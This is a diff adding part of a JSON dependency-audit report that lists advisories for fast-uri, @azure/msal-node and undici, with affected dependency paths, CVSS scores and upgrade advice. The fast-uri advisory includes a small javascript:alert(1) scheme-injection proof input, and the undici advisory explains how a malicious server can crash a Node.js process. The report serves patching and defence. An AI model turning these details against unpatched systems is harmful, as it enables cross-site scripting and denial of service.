+            "cli > @paperclipai/server@link:../server > @paperclipai/adapter-claude-local@link:../packages/adapters/claude-local > @agentclientprotocol/claude-agent-acp@0.73.0 > @anthropic-ai/claude-agent-sdk@0.3.280 > @modelcontextprotocol/sdk@1.31.0 > ajv@8.20.0 > fast-uri@3.1.8",
+            "cli > @paperclipai/server@link:../server > @paperclipai/adapter-claude-local@link:../packages/adapters/claude-local > @agentclientprotocol/claude-agent-acp@0.73.0 > @anthropic-ai/claude-agent-sdk@0.3.280 > @modelcontextprotocol/sdk@1.31.0 > ajv-formats@3.0.1 > ajv@8.20.0 > fast-uri@3.1.8",
+            "cli > @paperclipai/server@link:../server > @paperclipai/adapter-claude-local@link:../packages/adapters/claude-local > @modelcontextprotocol/sdk@1.31.0 > ajv@8.20.0 > fast-uri@3.1.8",
+            "cli > @paperclipai/server@link:../server > @paperclipai/adapter-claude-local@link:../packages/adapters/claude-local > @modelcontextprotocol/sdk@1.31.0 > ajv-formats@3.0.1 > ajv@8.20.0 > fast-uri@3.1.8",
+            "cli > @paperclipai/server@link:../server > ajv@8.20.0 > fast-uri@3.1.8",
+            "cli > @paperclipai/server@link:../server > ajv-formats@3.0.1 > ajv@8.20.0 > fast-uri@3.1.8",
+            "packages/adapters/claude-local > @agentclientprotocol/claude-agent-acp@0.73.0 > @anthropic-ai/claude-agent-sdk@0.3.280 > @modelcontextprotocol/sdk@1.31.0 > ajv@8.20.0 > fast-uri@3.1.8",
+            "packages/adapters/claude-local > @agentclientprotocol/claude-agent-acp@0.73.0 > @anthropic-ai/claude-agent-sdk@0.3.280 > @modelcontextprotocol/sdk@1.31.0 > ajv-formats@3.0.1 > ajv@8.20.0 > fast-uri@3.1.8",
+            "packages/adapters/claude-local > @modelcontextprotocol/sdk@1.31.0 > ajv@8.20.0 > fast-uri@3.1.8",
+            "packages/adapters/claude-local > @modelcontextprotocol/sdk@1.31.0 > ajv-formats@3.0.1 > ajv@8.20.0 > fast-uri@3.1.8",
+            "packages/paperclip-runner > @agentclientprotocol/claude-agent-acp@0.73.0 > @anthropic-ai/claude-agent-sdk@0.3.280 > @modelcontextprotocol/sdk@1.31.0 > ajv@8.20.0 > fast-uri@3.1.8",
+            "packages/paperclip-runner > @agentclientprotocol/claude-agent-acp@0.73.0 > @anthropic-ai/claude-agent-sdk@0.3.280 > @modelcontextprotocol/sdk@1.31.0 > ajv-formats@3.0.1 > ajv@8.20.0 > fast-uri@3.1.8",
+            "packages/paperclip-runner > @modelcontextprotocol/sdk@1.31.0 > ajv@8.20.0 > fast-uri@3.1.8",
+            "packages/paperclip-runner > @modelcontextprotocol/sdk@1.31.0 > ajv-formats@3.0.1 > ajv@8.20.0 > fast-uri@3.1.8",
+            "packages/paperclip-runner > ajv@8.20.0 > fast-uri@3.1.8",
+            "server > @paperclipai/adapter-claude-local@link:../packages/adapters/claude-local > @agentclientprotocol/claude-agent-acp@0.73.0 > @anthropic-ai/claude-agent-sdk@0.3.280 > @modelcontextprotocol/sdk@1.31.0 > ajv@8.20.0 > fast-uri@3.1.8",
+            "server > @paperclipai/adapter-claude-local@link:../packages/adapters/claude-local > @agentclientprotocol/claude-agent-acp@0.73.0 > @anthropic-ai/claude-agent-sdk@0.3.280 > @modelcontextprotocol/sdk@1.31.0 > ajv-formats@3.0.1 > ajv@8.20.0 > fast-uri@3.1.8",
+            "server > @paperclipai/adapter-claude-local@link:../packages/adapters/claude-local > @modelcontextprotocol/sdk@1.31.0 > ajv@8.20.0 > fast-uri@3.1.8",
+            "server > @paperclipai/adapter-claude-local@link:../packages/adapters/claude-local > @modelcontextprotocol/sdk@1.31.0 > ajv-formats@3.0.1 > ajv@8.20.0 > fast-uri@3.1.8",
+            "server > ajv@8.20.0 > fast-uri@3.1.8",
+            "server > ajv-formats@3.0.1 > ajv@8.20.0 > fast-uri@3.1.8",
+            "ui > @paperclipai/adapter-claude-local@link:../packages/adapters/claude-local > @agentclientprotocol/claude-agent-acp@0.73.0 > @anthropic-ai/claude-agent-sdk@0.3.280 > @modelcontextprotocol/sdk@1.31.0 > ajv@8.20.0 > fast-uri@3.1.8",
+            "ui > @paperclipai/adapter-claude-local@link:../packages/adapters/claude-local > @agentclientprotocol/claude-agent-acp@0.73.0 > @anthropic-ai/claude-agent-sdk@0.3.280 > @modelcontextprotocol/sdk@1.31.0 > ajv-formats@3.0.1 > ajv@8.20.0 > fast-uri@3.1.8",
+            "ui > @paperclipai/adapter-claude-local@link:../packages/adapters/claude-local > @modelcontextprotocol/sdk@1.31.0 > ajv@8.20.0 > fast-uri@3.1.8",
+            "ui > @paperclipai/adapter-claude-local@link:../packages/adapters/claude-local > @modelcontextprotocol/sdk@1.31.0 > ajv-formats@3.0.1 > ajv@8.20.0 > fast-uri@3.1.8"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/fastify/fast-uri/security/advisories/GHSA-333x-w4r6-6crp\n- https://nvd.nist.gov/vuln/detail/CVE-2026-110725\n- https://github.com/fastify/fast-uri/commit/39e6493c1356f30a0084171627eb266786e1620e\n- https://github.com/fastify/fast-uri/commit/a9b8d67353630aab053cd727cf629023dd018d2b\n- https://cna.openjsf.org/security-advisories.html\n- https://github.com/fastify/fast-uri/releases/tag/v2.4.8\n- https://github.com/fastify/fast-uri/releases/tag/v3.1.9\n- https://github.com/fastify/fast-uri/releases/tag/v4.2.3\n- https://github.com/advisories/GHSA-333x-w4r6-6crp",
+      "created": "2026-10-23T21:36:40.000Z",
+      "id": 1243107,
+      "npm_advisory_id": null,
+      "overview": "### Impact\n\n`fast-uri`'s `serialize()`, `normalize()`, and `resolve()`, when called with the non-default option `reference: 'suffix'` on a reference that has no authority, emit a relative reference whose first path segment contains a bare colon without escaping it. RFC 3986 section 3.3 requires the first segment of a `path-noscheme` reference not to contain a colon, precisely because a bare colon makes the string reparse as an absolute URI with a scheme. `fast-uri`'s default serialization escapes that colon, but the suffix path does not.\n\nFor example, `normalize('javascript:alert(1)', { reference: 'suffix' })` returns `javascript:alert(1)`, which reparses as a live `javascript:` scheme; `data:` and `vbscript:` behave the same.\n\nApplications that serialize or normalize a relative reference with `reference: 'suffix'` and then treat the result as a URI can turn inert input into a live `javascript:`, `data:`, or `vbscript:` URL (a cross-site scripting vector), and `equal()` can conflate a scheme-bearing reference with a relative one. Exposure is limited to applications that use the non-default `reference: 'suffix'` option.\n\n### Patches\n\nUpgrade to `fast-uri` `2.4.8`, `3.1.9`, or `4.2.3`.\n\n### Workarounds\n\nDo not use the `reference: 'suffix'` option on untrusted input. If suffix output is required, percent-encode a colon in the first path segment of the result before treating it as a URI.",
+      "reported_by": null,
+      "title": "fast-uri vulnerable to scheme injection via an unescaped first-segment colon in suffix references",
+      "metadata": null,
+      "cves": [
+        "CVE-2026-110725"
+      ],
+      "access": "public",
+      "severity": "low",
+      "module_name": "fast-uri",
+      "vulnerable_versions": ">=3.0.0 <3.1.9",
+      "github_advisory_id": "GHSA-333x-w4r6-6crp",
+      "recommendation": "Upgrade to version 3.1.9 or later",
+      "patched_versions": ">=3.1.9",
+      "updated": "2026-10-23T21:36:41.000Z",
+      "cvss": {
+        "score": 3.7,
+        "vectorString": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:L/A:N"
+      },
+      "cwe": [
+        "CWE-41",
+        "CWE-116"
+      ],
+      "url": "https://github.com/advisories/GHSA-333x-w4r6-6crp"
+    },
+    "1243111": {
+      "findings": [
+        {
+          "version": "5.6.0",
+          "paths": [
+            "cli > @paperclipai/server@link:../server > @chat-adapter/teams@4.39.0 > @microsoft/teams.apps@2.0.16 > @azure/msal-node@5.6.0",
+            "server > @chat-adapter/teams@4.39.0 > @microsoft/teams.apps@2.0.16 > @azure/msal-node@5.6.0"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/AzureAD/microsoft-authentication-library-for-js/security/advisories/GHSA-xcx6-jx8p-x3h5\n- https://nvd.nist.gov/vuln/detail/CVE-2026-109461\n- https://github.com/AzureAD/microsoft-authentication-library-for-js/pull/8901\n- https://github.com/AzureAD/microsoft-authentication-library-for-js/commit/f550958586475dbfeb1cd44be14a2d653728850e\n- https://github.com/AzureAD/microsoft-authentication-library-for-js/releases/tag/msal-node-v7.1.0\n- https://msrc.microsoft.com/update-guide/vulnerability/CVE-2026-109461\n- https://github.com/advisories/GHSA-xcx6-jx8p-x3h5",
+      "created": "2026-10-23T22:16:44.000Z",
+      "id": 1243111,
+      "npm_advisory_id": null,
+      "overview": "### Impact\n\nOrigin validation error in Microsoft Authentication Library (MSAL) for Node.js allows an unauthorized attacker to disclose information over a network. This affects the auth_code flow.\n\n### Patches\n\nVersion 7.1.0 and higher are patched.\n\n### Workarounds\n\nEnsure you pass in only the auth_code to to acquireTokenByCode",
+      "reported_by": null,
+      "title": "MSAL Node authorization code flow may disclose parameters to an attacker-controlled endpoint",
+      "metadata": null,
+      "cves": [
+        "CVE-2026-109461"
+      ],
+      "access": "public",
+      "severity": "high",
+      "module_name": "@azure/msal-node",
+      "vulnerable_versions": ">=5.0.0-beta.0 <7.1.0",
+      "github_advisory_id": "GHSA-xcx6-jx8p-x3h5",
+      "recommendation": "Upgrade to version 7.1.0 or later",
+      "patched_versions": ">=7.1.0",
+      "updated": "2026-10-23T22:16:45.000Z",
+      "cvss": {
+        "score": 7.5,
+        "vectorString": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N"
+      },
+      "cwe": [
+        "CWE-346"
+      ],
+      "url": "https://github.com/advisories/GHSA-xcx6-jx8p-x3h5"
+    },
+    "1243112": {
+      "findings": [
+        {
+          "version": "8.10.2",
+          "paths": [
+            "cli > @paperclipai/server@link:../server > @better-auth/passkey@1.7.2 > better-auth@1.7.2 > vitest@4.1.11 > jsdom@30.0.1 > undici@8.10.2",
+            "cli > @paperclipai/server@link:../server > @better-auth/scim@1.7.2 > better-auth@1.7.2 > vitest@4.1.11 > jsdom@30.0.1 > undici@8.10.2",
+            "cli > @paperclipai/server@link:../server > @better-auth/sso@1.7.2 > better-auth@1.7.2 > vitest@4.1.11 > jsdom@30.0.1 > undici@8.10.2",
+            "cli > @paperclipai/server@link:../server > @vercel/connect@0.6.1 > better-auth@1.7.2 > vitest@4.1.11 > jsdom@30.0.1 > undici@8.10.2",
+            "cli > @paperclipai/server@link:../server > better-auth@1.7.2 > vitest@4.1.11 > jsdom@30.0.1 > undici@8.10.2",
+            "cli > @paperclipai/server@link:../server > jsdom@30.0.1 > undici@8.10.2",
+            "server > @better-auth/passkey@1.7.2 > better-auth@1.7.2 > vitest@4.1.11 > jsdom@30.0.1 > undici@8.10.2",
+            "server > @better-auth/scim@1.7.2 > better-auth@1.7.2 > vitest@4.1.11 > jsdom@30.0.1 > undici@8.10.2",
+            "server > @better-auth/sso@1.7.2 > better-auth@1.7.2 > vitest@4.1.11 > jsdom@30.0.1 > undici@8.10.2",
+            "server > @vercel/connect@0.6.1 > better-auth@1.7.2 > vitest@4.1.11 > jsdom@30.0.1 > undici@8.10.2",
+            "server > better-auth@1.7.2 > vitest@4.1.11 > jsdom@30.0.1 > undici@8.10.2",
+            "server > jsdom@30.0.1 > undici@8.10.2",
+            "ui > @better-auth/passkey@1.7.2 > better-auth@1.7.2 > vitest@4.1.11 > jsdom@30.0.1 > undici@8.10.2",
+            "ui > better-auth@1.7.2 > vitest@4.1.11 > jsdom@30.0.1 > undici@8.10.2"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/nodejs/undici/security/advisories/GHSA-xjj6-f33q-929c\n- https://nvd.nist.gov/vuln/detail/CVE-2026-109869\n- https://github.com/nodejs/undici/commit/07ded4941b1e72afec862958c3b8ddf468f3b429\n- https://github.com/nodejs/undici/commit/1325a87dfb3492f8e87e6b0a84b3bda4e82e3436\n- https://github.com/nodejs/undici/commit/b5084c7dc239172d75c336b1cd51ddac023938a5\n- https://cna.openjsf.org/security-advisories.html\n- https://github.com/nodejs/undici/releases/tag/v6.29.1\n- https://github.com/nodejs/undici/releases/tag/v7.30.1\n- https://github.com/nodejs/undici/releases/tag/v8.12.2\n- https://github.com/advisories/GHSA-xjj6-f33q-929c",
+      "created": "2026-10-23T22:14:31.000Z",
+      "id": 1243112,
+      "npm_advisory_id": null,
+      "overview": "### Impact\n\nundici's `fetch()` crashes the Node.js process when a malicious server returns a response with more than five content codings and closes the connection before sending the body. undici rejects such responses (a content-encoding limit), but it created the internal response stream before that check and returned without attaching an error listener or aborting the request. The early close then surfaces a content-length mismatch on that orphaned internal stream, which Node.js treats as an unhandled `error` and terminates the process. A remote, unauthenticated server can trigger this with a single response, even when the application correctly catches the `fetch()` rejection. undici 6.x, 7.x, and 8.x are affected.\n\n### Patches\n\nUpgrade to `6.29.1`, `7.30.1`, or `8.12.2`. undici now validates the content-encoding chain before creating the internal body stream and aborts the response when the limit is exceeded, so no error can surface on an orphaned stream.\n\n### Workarounds\n\nNone.",
+      "reported_by": null,
+      "title": "undici vulnerable to Denial of Service via unhandled error on excessive content-encodings",
+      "metadata": null,
+      "cves": [
+        "CVE-2026-109869"
+      ],
+      "access": "public",
+      "severity": "high",
+      "module_name": "undici",
+      "vulnerable_versions": ">=8.0.0 <8.12.2",
+      "github_advisory_id": "GHSA-xjj6-f33q-929c",
+      "recommendation": "Upgrade to version 8.12.2 or later",
+      "patched_versions": ">=8.12.2",
+      "updated": "2026-10-23T22:14:32.000Z",
+      "cvss": {
+        "score": 7.5,
+        "vectorString": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H"
+      },
+      "cwe": [
+        "CWE-248",
+        "CWE-459"
+      ],
+      "url": "https://github.com/advisories/GHSA-xjj6-f33q-929c"
+    },
+    "1243114": {
+      "findings": [
+        {
+          "version": "6.28.1",
+          "paths": [
+            "cli > @paperclipai/server@link:../server > @chat-adapter/discord@4.39.0 > discord.js@14.27.0 > @discordjs/rest@2.6.3 > undici@6.28.1",
+            "cli > @paperclipai/server@link:../server > @chat-adapter/discord@4.39.0 > discord.js@14.27.0 > @discordjs/ws@1.2.3 > @discordjs/rest@2.6.3 > undici@6.28.1",
+            "cli > @paperclipai/server@link:../server > @chat-adapter/discord@4.39.0 > discord.js@14.27.0 > undici@6.28.1",
+            "cli > @paperclipai/server@link:../server > @discordjs/ws@1.2.3 > @discordjs/rest@2.6.3 > undici@6.28.1",
+            "server > @chat-adapter/discord@4.39.0 > discord.js@14.27.0 > @discordjs/rest@2.6.3 > undici@6.28.1",
+            "server > @chat-adapter/discord@4.39.0 > discord.js@14.27.0 > @discordjs/ws@1.2.3 > @discordjs/rest@2.6.3 > undici@6.28.1",
+            "server > @chat-adapter/discord@4.39.0 > discord.js@14.27.0 > undici@6.28.1",
+            "server > @discordjs/ws@1.2.3 > @discordjs/rest@2.6.3 > undici@6.28.1"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/nodejs/undici/security/advisories/GHSA-xjj6-f33q-929c\n- https://nvd.nist.gov/vuln/detail/CVE-2026-109869\n- https://github.com/nodejs/undici/commit/07ded4941b1e72afec862958c3b8ddf468f3b429\n- https://github.com/nodejs/undici/commit/1325a87dfb3492f8e87e6b0a84b3bda4e82e3436\n- https://github.com/nodejs/undici/commit/b5084c7dc239172d75c336b1cd51ddac023938a5\n- https://cna.openjsf.org/security-advisories.html\n- https://github.com/nodejs/undici/releases/tag/v6.29.1\n- https://github.com/nodejs/undici/releases/tag/v7.30.1\n- https://github.com/nodejs/undici/releases/tag/v8.12.2\n- https://github.com/advisories/GHSA-xjj6-f33q-929c",
+      "created": "2026-10-23T22:14:31.000Z",
+      "id": 1243114,
+      "npm_advisory_id": null,
+      "overview": "### Impact\n\nundici's `fetch()` crashes the Node.js process when a malicious server returns a response with more than five content codings and closes the connection before sending the body. undici rejects such responses (a content-encoding limit), but it created the internal response stream before that check and returned without attaching an error listener or aborting the request. The early close then surfaces a content-length mismatch on that orphaned internal stream, which Node.js treats as an unhandled `error` and terminates the process. A remote, unauthenticated server can trigger this with a single response, even when the application correctly catches the `fetch()` rejection. undici 6.x, 7.x, and 8.x are affected.\n\n### Patches\n\nUpgrade to `6.29.1`, `7.30.1`, or `8.12.2`. undici now validates the content-encoding chain before creating the internal body stream and aborts the response when the limit is exceeded, so no error can surface on an orphaned stream.\n\n### Workarounds\n\nNone.",
+      "reported_by": null,
+      "title": "undici vulnerable to Denial of Service via unhandled error on excessive content-encodings",
+      "metadata": null,
+      "cves": [
+        "CVE-2026-109869"
+      ],
+      "access": "public",
+      "severity": "high",
+      "module_name": "undici",
+      "vulnerable_versions": ">=6.23.0 <6.29.1",
+      "github_advisory_id": "GHSA-xjj6-f33q-929c",
+      "recommendation": "Upgrade to version 6.29.1 or later",
+      "patched_versions": ">=6.29.1",
+      "updated": "2026-10-23T22:14:32.000Z",
+      "cvss": {
+        "score": 7.5,
+        "vectorString": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H"
+      },
+      "cwe": [
+        "CWE-248",
+        "CWE-459"
+      ],
+      "url": "https://github.com/advisories/GHSA-xjj6-f33q-929c"
+    }
+  },
+  "muted": [],
+  "metadata": {
+    "vulnerabilities": {
+      "info": 0,
+      "low": 5,
+      "moderate": 16,
+      "high": 8,
+      "critical": 0
+    },
+    "dependencies": 1355,
+    "devDependencies": 0,
+    "optionalDependencies": 0,
+    "totalDependencies": 1355
+  }
+}
